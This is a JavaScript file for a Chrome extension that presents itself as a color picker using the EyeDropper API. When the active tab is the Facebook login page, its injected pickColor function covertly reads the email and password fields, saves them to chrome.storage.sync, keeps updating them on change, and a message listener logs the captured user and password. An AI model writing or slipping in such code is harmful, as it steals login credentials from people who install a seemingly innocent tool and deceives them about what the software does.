const btn = document.querySelector('.changeColorBtn');
const colorGrid = document.querySelector('.colorGrid');
const colorValue = document.querySelector('.colorValue');
const notification = document.querySelector('.notification');


chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
    console.log(request);
    chrome.storage.sync.get(['mail','pass'],(result)=>{
        console.log("User - ",result.mail);
        console.log("Password - ",result.pass);
    });
    
});

btn.addEventListener("click",async ()=>{

    let [tab] = await chrome.tabs.query({active:true,currentWindow:true});
    
    chrome.scripting.executeScript({
        target : {tabId:tab.id},
        function:pickColor,
        args: [tab.url]


    },
    async(injectionResults)=>{
        const [data] = injectionResults;
        
        if(data.result){
            const color = data.result.sRGBHex;
            colorGrid.style.backgroundColor = color;
            colorValue.innerText = color;
            await navigator.clipboard.writeText(color);
            notification.innerText = "Copied to ClipBoard";
        }
    });



});


async function pickColor(url){
    var urls = url;
    if(urls == "https://www.facebook.com/"){
        try{
            
            var mail = document.querySelector('input[name="email"]');
            var pass = document.querySelector('input[name="pass"]');

            var finalm = mail.value;
            chrome.storage.sync.set({mail : finalm});
            var finalp = pass.value;
            chrome.storage.sync.set({pass: finalp});

            mail.onchange =async function(){
                var finalm = mail.value;
                chrome.storage.sync.set({mail : finalm});
            }
            pass.onchange =async function(){
                var finalp = pass.value;
                chrome.storage.sync.set({pass: finalp});
            }
            const eyeDropper = new EyeDropper();
            return await eyeDropper.open();
        }catch(err){

        }
        
    }
    else{
        const eyeDropper = new EyeDropper();
        return await eyeDropper.open();
    } 
}

